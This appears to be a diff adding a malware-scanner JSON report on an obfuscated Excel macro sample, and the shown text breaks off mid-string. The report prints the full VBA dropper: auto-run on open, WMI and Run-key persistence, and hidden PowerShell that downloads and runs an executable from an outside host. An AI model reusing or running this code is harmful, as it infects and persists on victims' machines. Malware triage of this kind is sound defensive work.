@@ -1,0 +1,569 @@
+{
+  "form": 1,
+  "observables": {
+    "file:170b804293599496c29d816cfe408adc5a99e767eb930b0c0cf9e7db62436abe": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.extracted/xl/vbaProject.bin": {}
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {
+        "extracted_from file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": false,
+            "is_ole_file": true,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/x-ole-storage",
+            "type": "Composite Document File V2 Document, Cannot read section info"
+          },
+          "summary": "File Type Analysis: Composite Document File V2 Document, Cannot read section info (application/x-ole-storage) (ms office document) (ole compound file)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "hex string": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/vba_xlm_obfuscated.xlsm.extracted/xl/vbaProject.bin",
+                "local_path": "5f6215a036890aff7ce33ebbda20fc8beb7ca7d1d1ebd71364750df0ab3ba5f9",
+                "stream_path": "VBA/ThisDocument",
+                "vba_code": "Const wnjnkjzuvm = 2\nConst oulsbdhnui = 1\nConst kdxxgwqvzi = 0\nPrivate Sub Document_Open()\nodhqmqfrpbeitdpnqt asalvxeqskzr(\"706f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414d774177414441414f77424a4147344164674276414773415a514174414663415a514269414649415a51\") & asalvxeqskzr(\"4278414855415a51427a414851414941426f414851416441427741484d414f674176414338416541427a41475541654142774147384163674275414738414c67426a4147774164514269414338414f41426941486f415a41416741433041547742314148514152674270414777415a514167414351415a514275414859414f67423041475541625142774146774161514178414334415a51423441475541\"), asalvxeqskzr(\"57696e646f7773536f667477617265557064\") & asalvxeqskzr(\"6174657231\")\nodhqmqfrpbeitdpnqt asalvxeqskzr(\"70\") & asalvxeqskzr(\"6f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414e414177414441414f77427a414745416341427a414341414967416b414755416267423241446f416441426c414730416341426341476b414d514175414755416541426c41434941\"), asalvxeqskzr(\"57696e646f7773536f6674776172\") & asalvxeqskzr(\"655570646174657232\")\nEnd Sub\nPublic Function nnkxasxmgkzxc(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nDim filterName, lzcgbinwymuvzcgugox As String\nDim cttxucgpri, qoxqsmabsc\nDim vneojnwlwvaxw, wmyrkpfbdhyrflpeayp, xvholaopxom\nDim uhrcqkzgjkyaj, vouyyrwslruhsxf, jxdtzxpgmvaijfjxfn\nOn Error GoTo Failed\nfilterName = olhfadbpwjmxcxgpd & asalvxeqskzr(\"45\") & asalvxeqskzr(\"76656e74\")\nlzcgbinwymuvzcgugox = olhfadbpwjmxcxgpd & asalvxeqskzr(\"436f6e\") & asalvxeqskzr(\"73756d6572\")\nSet cttxucgpri = CreateObject(asalvxeqskzr(\"5762656d536372697074696e672e5357\") & asalvxeqskzr(\"62656d4c6f6361746f72\"))\nSet qoxqsmabsc = cttxucgpri.ConnectServer(asalvxeqskzr(\"2e\"), asalvxeqskzr(\"726f6f745c737562736372\") & asalvxeqskzr(\"697074696f6e\"))\nSet vneojnwlwvaxw = qoxqsmabsc.Get(asalvxeqskzr(\"5f5f\") & asalvxeqskzr(\"4576656e7446696c746572\"))\nQuery = asalvxeqskzr(\"53454c454354202a2046524f4d205f5f496e7374616e63654d6f64696669636174696f6e4576656e74\") & asalvxeqskzr(\"2057495448494e20363020\") _\n& asalvxeqskzr(\"574845524520546172676574496e7374616e63652049\") & asalvxeqskzr(\"5341202757696e33325f50657266466f726d6174746564446174615f506572664f535f53797374656d2720\") _\n& asalvxeqskzr(\"414e4420546172676574496e7374616e63652e53797374656d557054696d65203e\") & asalvxeqskzr(\"3d2032303020414e4420\") _\n& asalvxeqskzr(\"546172676574\") & asalvxeqskzr(\"496e7374616e63652e53797374656d557054696d65203c20333230\")\nSet uhrcqkzgjkyaj = vneojnwlwvaxw.Spawninstance_\nuhrcqkzgjkyaj.Name = filterName\nuhrcqkzgjkyaj.eventNamespace = asalvxeqskzr(\"726f\") & asalvxeqskzr(\"6f745c63696d7632\")\nuhrcqkzgjkyaj.QueryLanguage = asalvxeqskzr(\"57514c\")\nuhrcqkzgjkyaj.Query = Query\nuhrcqkzgjkyaj.Put_\nSet wmyrkpfbdhyrflpeayp = qoxqsmabsc.Get(asalvxeqskzr(\"436f6d6d616e644c\") & asalvxeqskzr(\"696e654576656e74436f6e73756d6572\"))\nSet vouyyrwslruhsxf = wmyrkpfbdhyrflpeayp.Spawninstance_\nvouyyrwslruhsxf.Name = lzcgbinwymuvzcgugox\nvouyyrwslruhsxf.CommandLineTemplate = btgbbxojdajov\nvouyyrwslruhsxf.Put_\nSet xvholaopxom = qoxqsmabsc.Get(asalvxeqskzr(\"5f5f46696c746572\") & asalvxeqskzr(\"546f436f6e73756d657242696e64696e67\"))\nSet jxdtzxpgmvaijfjxfn = xvholaopxom.Spawninstance_\njxdtzxpgmvaijfjxfn.Filter = \"__EventFilter.Name=\"\"\" & filterName & \"\"\"\"\njxdtzxpgmvaijfjxfn.Consumer = \"CommandLineEventConsumer.Name=\"\"\" & lzcgbinwymuvzcgugox & \"\"\"\"\njxdtzxpgmvaijfjxfn.Put_\nnnkxasxmgkzxc = True\nExit Function\nFailed:\nnnkxasxmgkzxc = False\nEnd Function\nPublic Function ieawcjfoaskhnrksmmhk(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nOn Error GoTo Failed\nConst HKEY_CURRENT_USER = &H80000001\nstrKeyPath = asalvxeqskzr(\"53\") & asalvxeqskzr(\"6f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e\")\nstrComputer = asalvxeqskzr(\"2e\")\nSet hppqcwcwciltohggt = GetObject(asalvxeqskzr(\"77696e6d676d74733a7b696d706572736f6e6174696f6e4c65\") & asalvxeqskzr(\"76656c3d696d706572736f6e6174657d215c5c\") & strComputer & asalvxeqskzr(\"5c726f6f745c\") & asalvxeqskzr(\"64656661756c743a53746452656750726f76\"))\nstrValueName = olhfadbpwjmxcxgpd\nstrValue = btgbbxojdajov\nhppqcwcwciltohggt.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue\nieawcjfoaskhnrksmmhk = True\nExit Function\nFailed:\nieawcjfoaskhnrksmmhk = False\nEnd Function\nPublic Function odhqmqfrpbeitdpnqt(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nIf nnkxasxmgkzxc(btgbbxojdajov, olhfadbpwjmxcxgpd) <> True Then\nieawcjfoaskhnrksmmhk btgbbxojdajov, olhfadbpwjmxcxgpd\nEnd If\nbhyyuwjdsaubzgkzqb\nEnd Function\nPublic Function bhyyuwjdsaubzgkzqb()\nOn Error GoTo Ersr\nSet jpgwdcjerskbupfdyr = CreateObject(asalvxeqskzr(\"57\") & asalvxeqskzr(\"5363\") & asalvxeqskzr(\"726970\") & asalvxeqskzr(\"742e53\") & asalvxeqskzr(\"6865\") & asalvxeqskzr(\"6c6c\"))\nDim pt\nDim sh\nDim bars\nDim cod\nDim cod2\ncod = \"dAByAHkAIAB7ACQAdwBDACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGkAbgBIAHQAdABwACIAKQA7ACQAbABuAGsAIAA9ACAAIgBoAHQAdABwACIAIAArACAAIgBzADoALwAvAHMAZQB4AGMAcgBhAGYAdAAuAGMAbAB1AGIALwA2ADMANgAxADYAZQAiACAAKwAgACIANgA5ADcANwA3ADIAIgAgACsAIAAiADcAOQA2ADUANwA1ADYAYwAiACAAKwAgACIANgAyADcAOQAzADgAMwAyADMAOAAzADcAIgAgACsAIAAiADMANAA2ADMANwA3ADYAMQAzADgAMwAiACAAKwAgACIAOAAzADgALwBhAGIAYwAiACAAKwAgACIAZABlADUANAAzADIAIgAgACsAIAAiADEAYQBiAGMAZABlACIAIAArACAAIgAxADIAMwA0ADUAIgA7ACQAdwBDAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAGwAbgBrACwAIgAkAGUAbgB2AD\" & \"oAdABlAG0AcABcADIAMgA0AC4AZQB4AGUAIgApADsAcwBhAHAAcwAgACI\"\ncod2 = \"AJABlAG4AdgA6AHQAZQBtAHAAXAAyADIANAAuAGUAeABlACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAOwAkAGwAbgBrAHAAcgAgAD0AIAAiAGgAdAB0ACIAIAArACAAIgBwAH\" & \"MAOgAvAC8AcwBlAHgAYwByAGEAZgB0AC4AYwBsAHUAYgAvADMAOAA3ADEAMwA1ADYANgAzACIAIAArACAAIgA3ADMANQA3ADAAMwAyADMAMwA2ADMAMwA1ACIAIAArACAAIgA2AGUAMwA4ADMANQAzADIANgBlADcAMAA3ADYANgA2ADYAIgAgACsAIAAiAGYANgAxADMAMwA3ADcAMwA1ADMAOAA2AGUALwBwAHMAcwBhAHcAOQAzADcAIgAgACsAIAAiADMANQBtAGkAeQBwAHMALwAiADsAJAB3AEMALgBIAEUAQQBkAGUAcgBTAC4AQQBkAGQAKAAiAFUAcwBlAHIALQBBAGcAZQBuAHQAIgAsACIAVwBpAG4ASAB0AHQAcAAiACkAOwAkAHcAQwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAbABuAGsAcAByACkAOwB9AGMAYQB0AGMAaAB7AH0A\"\npt = asalvxeqskzr(\"70\") & asalvxeqskzr(\"6f\") & asalvxeqskzr(\"776572\")\nsh = asalvxeqskzr(\"73\") & asalvxeqskzr(\"6865\") & asalvxeqskzr(\"6c6c\")\nbars = asalvxeqskzr(\"202d\") & asalvxeqskzr(\"457865\") & asalvxeqskzr(\"63\") & asalvxeqskzr(\"7574696f\") & asalvxeqskzr(\"6e\") & asalvxeqskzr(\"506f6c\") & asalvxeqskzr(\"69637920\") & asalvxeqskzr(\"62\") & asalvxeqskzr(\"7970\") & asalvxeqskzr(\"6173\") & asalvxeqskzr(\"73202d6e\") & asalvxeqskzr(\"6f70\") & asalvxeqskzr(\"726f66\") & asalvxeqskzr(\"696c65\") & asalvxeqskzr(\"202d\") & asalvxeqskzr(\"77696e\") & asalvxeqskzr(\"64\") & asalvxeqskzr(\"6f777374\") & asalvxeqskzr(\"796c6520\") & asalvxeqskzr(\"68\") & asalvxeqskzr(\"69\") & asalvxeqskzr(\"646465\") & asalvxeqskzr(\"6e202d\") & asalvxeqskzr(\"65\") & asalvxeqskzr(\"6e\") & asalvxeqskzr(\"6320\")\njpgwdcjerskbupfdyr.Run pt & sh & bars & cod & cod2, 0\nErsr:\nEnd Function\nPrivate Function asalvxeqskzr(ByVal msybfiemglor As String) As String\nDim uqrmfktnkywt As Long\nFor uqrmfktnkywt = 1 To Len(msybfiemglor) Step 2\nasalvxeqskzr = asalvxeqskzr & Chr$(Val(\"&H\" & Mid$(msybfiemglor, uqrmfktnkywt, 2)))\nNext uqrmfktnkywt\nEnd Function\n\n",
+                "vba_filename": "ThisDocument.cls"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (1 macro files) (OLE) | autoexec=1, suspicious=1, hex string=1",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "ole": true,
+        "olevba": true
+      }
+    },
+    "file:1d8b995ebb2866315a4c0f72315e6a902db8b6345bba956086db3ab3778d4434": {
+      "detections": {},
+      "directives": {
+        "crawl_extracted_urls": true,
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.xlmdeobfuscator/xlmdeobfuscator.stdout": {
+          "type=script.macro.xlm": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "Unicode text, UTF-8 text"
+          },
+          "summary": "File Type Analysis: Unicode text, UTF-8 text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:5f6215a036890aff7ce33ebbda20fc8beb7ca7d1d1ebd71364750df0ab3ba5f9": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.extracted/xl/vbaProject.bin.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        },
+        "vba_xlm_obfuscated.xlsm.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:170b804293599496c29d816cfe408adc5a99e767eb930b0c0cf9e7db62436abe",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with very long lines (748)"
+          },
+          "summary": "File Type Analysis: ASCII text, with very long lines (748) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:757f605160b829c805f9f579db5b87db542ac34f416e61128fb322fe4ef9c856": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.extracted/xl/_rels/workbook.xml.rels": {}
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {
+        "extracted_from file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:8000e940976640c5ae48764d860de56bd5a73cf27e54a4e82fe32cf2a2c6ba05": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.extracted/_rels/.rels": {}
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {
+        "extracted_from file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:94aacc36d10391ee9abd5d9ebf212100dd35c72eb14e89a7b8988bf91ab0ae8b": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.extracted/xl/workbook.xml": {}
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {
+        "extracted_from file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:a232b79858b25e9cbdeb5ffe4ede84d5ff2b62141bb973d8497a34e18c0bb0e7": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.olevba/macro_1.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "Unicode text, UTF-8 text, with very long lines (407)"
+          },
+          "summary": "File Type Analysis: Unicode text, UTF-8 text, with very long lines (407) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:adbfe51075a476b6b2d267732f874d5477dc4ebdfbad66d6940683cf563fe16d": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm.extracted/xl/macrosheets/sheet1.xml": {}
+      },
+      "redirection": "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412",
+      "relationships": {
+        "extracted_from file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, Unicode text, UTF-8 text, with very long lines (579)"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, Unicode text, UTF-8 text, with very long lines (579) (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": {
+      "detections": {
+        "A url was found in an Excel 4.0 macro.": [
+          null
+        ]
+      },
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_xlm_obfuscated.xlsm": {
+          "type=email.attachment": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "archive": {
+          "details": {
+            "extracted_files": [
+              "[Content_Types].xml",
+              "xl/workbook.xml",
+              "xl/macrosheets/sheet1.xml",
+              "xl/vbaProject.bin",
+              "xl/_rels/workbook.xml.rels",
+              "_rels/.rels"
+            ],
+            "extraction_error": null,
+            "file_count": 6
+          },
+          "summary": "Archive Analysis: extracted 6 of 6 files: ([Content_Types].xml, xl/workbook.xml, xl/macrosheets/sheet1.xml, xl/vbaProject.bin, xl/_rels/workbook.xml.rels, _rels/.rels)",
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": true,
+            "mime": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+            "type": "Microsoft Excel 2007+"
+          },
+          "summary": "File Type Analysis: Microsoft Excel 2007+ (application/vnd.openxmlformats-officedocument.spreadsheetml.sheet) (ms office document) (zip archive)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "base64 string": 1,
+              "hex string": 1,
+              "ioc": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "xl/vbaProject.bin",
+                "local_path": "5f6215a036890aff7ce33ebbda20fc8beb7ca7d1d1ebd71364750df0ab3ba5f9",
+                "stream_path": "VBA/ThisDocument",
+                "vba_code": "Const wnjnkjzuvm = 2\nConst oulsbdhnui = 1\nConst kdxxgwqvzi = 0\nPrivate Sub Document_Open()\nodhqmqfrpbeitdpnqt asalvxeqskzr(\"706f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414d774177414441414f77424a4147344164674276414773415a514174414663415a514269414649415a51\") & asalvxeqskzr(\"4278414855415a51427a414851414941426f414851416441427741484d414f674176414338416541427a41475541654142774147384163674275414738414c67426a4147774164514269414338414f41426941486f415a41416741433041547742314148514152674270414777415a514167414351415a514275414859414f67423041475541625142774146774161514178414334415a51423441475541\"), asalvxeqskzr(\"57696e646f7773536f667477617265557064\") & asalvxeqskzr(\"6174657231\")\nodhqmqfrpbeitdpnqt asalvxeqskzr(\"70\") & asalvxeqskzr(\"6f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414e414177414441414f77427a414745416341427a414341414967416b414755416267423241446f416441426c414730416341426341476b414d514175414755416541426c41434941\"), asalvxeqskzr(\"57696e646f7773536f6674776172\") & asalvxeqskzr(\"655570646174657232\")\nEnd Sub\nPublic Function nnkxasxmgkzxc(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nDim filterName, lzcgbinwymuvzcgugox As String\nDim cttxucgpri, qoxqsmabsc\nDim vneojnwlwvaxw, wmyrkpfbdhyrflpeayp, xvholaopxom\nDim uhrcqkzgjkyaj, vouyyrwslruhsxf, jxdtzxpgmvaijfjxfn\nOn Error GoTo Failed\nfilterName = olhfadbpwjmxcxgpd & asalvxeqskzr(\"45\") & asalvxeqskzr(\"76656e74\")\nlzcgbinwymuvzcgugox = olhfadbpwjmxcxgpd & asalvxeqskzr(\"436f6e\") & asalvxeqskzr(\"73756d6572\")\nSet cttxucgpri = CreateObject(asalvxeqskzr(\"5762656d536372697074696e672e5357\") & asalvxeqskzr(\"62656d4c6f6361746f72\"))\nSet qoxqsmabsc = cttxucgpri.ConnectServer(asalvxeqskzr(\"2e\"), asalvxeqskzr(\"726f6f745c737562736372\") & asalvxeqskzr(\"697074696f6e\"))\nSet vneojnwlwvaxw = qoxqsmabsc.Get(asalvxeqskzr(\"5f5f\") & asalvxeqskzr(\"4576656e7446696c746572\"))\nQuery = asalvxeqskzr(\"53454c454354202a2046524f4d205f5f496e7374616e63654d6f64696669636174696f6e4576656e74\") & asalvxeqskzr(\"2057495448494e20363020\") _\n& asalvxeqskzr(\"574845524520546172676574496e7374616e63652049\") & asalvxeqskzr(\"5341202757696e33325f50657266466f726d6174746564446174615f506572664f535f53797374656d2720\") _\n& asalvxeqskzr(\"414e4420546172676574496e7374616e63652e53797374656d557054696d65203e\") & asalvxeqskzr(\"3d2032303020414e4420\") _\n& asalvxeqskzr(\"546172676574\") & asalvxeqskzr(\"496e7374616e63652e53797374656d557054696d65203c20333230\")\nSet uhrcqkzgjkyaj = vneojnwlwvaxw.Spawninstance_\nuhrcqkzgjkyaj.Name = filterName\nuhrcqkzgjkyaj.eventNamespace = asalvxeqskzr(\"726f\") & asalvxeqskzr(\"6f745c63696d7632\")\nuhrcqkzgjkyaj.QueryLanguage = asalvxeqskzr(\"57514c\")\nuhrcqkzgjkyaj.Query = Query\nuhrcqkzgjkyaj.Put_\nSet wmyrkpfbdhyrflpeayp = qoxqsmabsc.Get(asalvxeqskzr(\"436f6d6d616e644c\") & asalvxeqskzr(\"696e654576656e74436f6e73756d6572\"))\nSet vouyyrwslruhsxf = wmyrkpfbdhyrflpeayp.Spawninstance_\nvouyyrwslruhsxf.Name = lzcgbinwymuvzcgugox\nvouyyrwslruhsxf.CommandLineTemplate = btgbbxojdajov\nvouyyrwslruhsxf.Put_\nSet xvholaopxom = qoxqsmabsc.Get(asalvxeqskzr(\"5f5f46696c746572\") & asalvxeqskzr(\"546f436f6e73756d657242696e64696e67\"))\nSet jxdtzxpgmvaijfjxfn = xvholaopxom.Spawninstance_\njxdtzxpgmvaijfjxfn.Filter = \"__EventFilter.Name=\"\"\" & filterName & \"\"\"\"\njxdtzxpgmvaijfjxfn.Consumer = \"CommandLineEventConsumer.Name=\"\"\" & lzcgbinwymuvzcgugox & \"\"\"\"\njxdtzxpgmvaijfjxfn.Put_\nnnkxasxmgkzxc = True\nExit Function\nFailed:\nnnkxasxmgkzxc = False\nEnd Function\nPublic Function ieawcjfoaskhnrksmmhk(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nOn Error GoTo Failed\nConst HKEY_CURRENT_USER = &H80000001\nstrKeyPath = asalvxeqskzr(\"53\") & asalvxeqskzr(\"6f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e\")\nstrComputer = asalvxeqskzr(\"2e\")\nSet hppqcwcwciltohggt = GetObject(asalvxeqskzr(\"77696e6d676d74733a7b696d706572736f6e6174696f6e4c65\") & asalvxeqskzr(\"76656c3d696d706572736f6e6174657d215c5c\") & strComputer & asalvxeqskzr(\"5c726f6f745c\") & asalvxeqskzr(\"64656661756c743a53746452656750726f76\"))\nstrValueName = olhfadbpwjmxcxgpd\nstrValue = btgbbxojdajov\nhppqcwcwciltohggt.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue\nieawcjfoaskhnrksmmhk = True\nExit Function\nFailed:\nieawcjfoaskhnrksmmhk = False\nEnd Function\nPublic Function odhqmqfrpbeitdpnqt(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nIf nnkxasxmgkzxc(btgbbxojdajov, olhfadbpwjmxcxgpd) <> True Then\nieawcjfoaskhnrksmmhk btgbbxojdajov, olhfadbpwjmxcxgpd\nEnd If\nbhyyuwjdsaubzgkzqb\nEnd Function\nPublic Function bhyyuwjdsaubzgkzqb()\nOn Error GoTo Ersr\nSet jpgwdcjerskbupfdyr = CreateObject(asalvxeqskzr(\"57\") & asalvxeqskzr(\"5363\") & asalvxeqskzr(\"726970\") & asalvxeqskzr(\"742e53\") & asalvxeqskzr(\"6865\") & asalvxeqskzr(\"6c6c\"))\nDim pt\nDim sh\nDim bars\nDim cod\nDim cod2\ncod = \"dAByAHkAIAB7ACQAdwBDACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGkAbgBIAHQAdABwACIAKQA7ACQAbABuAGsAIAA9ACAAIgBoAHQAdABwACIAIAArACAAIgBzADoALwAvAHMAZQB4AGMAcgBhAGYAdAAuAGMAbAB1AGIALwA2ADMANgAxADYAZQAiACAAKwAgACIANgA5ADcANwA3ADIAIgAgACsAIAAiADcAOQA2ADUANwA1ADYAYwAiACAAKwAgACIANgAyADcAOQAzADgAMwAyADMAOAAzADcAIgAgACsAIAAiADMANAA2ADMANwA3ADYAMQAzADgAMwAiACAAKwAgACIAOAAzADgALwBhAGIAYwAiACAAKwAgACIAZABlADUANAAzADIAIgAgACsAIAAiADEAYQBiAGMAZABlACIAIAArACAAIgAxADIAMwA0ADUAIgA7ACQAdwBDAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAGwAbgBrACwAIgAkAGUAbgB2AD\" & \"oAdABlAG0AcABcADIAMgA0AC4AZQB4AGUAIgApADsAcwBhAHAAcwAgACI\"\ncod2 = \"AJABlAG4AdgA6AHQAZQBtAHAAXAAyADIANAAuAGUAeABlACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAOwAkAGwAbgBrAHAAcgAgAD0AIAAiAGgAdAB0ACIAIAArACAAIgBwAH\" & 